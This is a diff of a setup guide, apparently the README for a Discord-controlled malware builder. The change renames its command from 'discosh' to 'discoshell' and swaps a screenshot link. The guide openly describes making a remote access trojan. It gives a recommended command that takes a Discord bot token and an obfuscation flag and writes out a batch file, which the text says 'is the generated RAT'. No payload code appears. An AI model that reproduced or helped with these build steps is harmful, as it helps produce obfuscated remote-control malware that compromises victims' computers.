@@ -15,11 +15,11 @@
 
 7. Open command prompt and cd to the location of the extracted file from step 2.
 
-8. Enter the command "discosh" to view the help manual.
-![image](https://media.discordapp.net/attachments/959762900443070485/966602879018360832/unknown.png)
+8. Enter the command "discoshell" to view the help manual.
+![image](https://media.discordapp.net/attachments/959762900443070485/969095436939984916/unknown.png)
 
 Recommended configuration:
-discosh -o output.bat -t {copied token from step 6} -p ! -obf -d
+discoshell -o output.bat -t {copied token from step 6} -p ! -obf -d
 
 9. The outputted batch file is the generated RAT.
 
